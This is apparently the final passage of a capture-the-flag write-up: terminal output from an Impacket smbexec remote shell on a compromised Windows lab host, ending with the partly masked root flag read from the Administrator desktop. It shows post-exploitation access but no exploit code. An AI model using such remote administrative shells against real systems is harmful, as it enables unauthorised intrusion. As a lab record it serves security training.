 Directory of c:\Users

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/07/2018  05:39 ��    <DIR>          .

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/07/2018  05:39 ��    <DIR>          ..

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
16/07/2018  01:14 ��    <DIR>          Administrator

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
14/07/2009  07:57 ��    <DIR>          Public

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/07/2018  06:16 ��    <DIR>          SVC_TGS

               0 File(s)              0 bytes
               5 Dir(s)  21.309.480.960 bytes free

c:\Users> cd Administrator

c:\Users\Administrator> cd Desktop

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 2AF3-72E4

 Directory of c:\Users\Administrator\Desktop

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/01/2021  07:49 ��    <DIR>          .

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
21/01/2021  07:49 ��    <DIR>          ..

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
14/04/2026  03:35 ��                34 root.txt

               1 File(s)             34 bytes
               2 Dir(s)  21.309.480.960 bytes free

c:\Users\Administrator\Desktop> type root.txt
ef6fd986a*********2f56a1e090e4
```
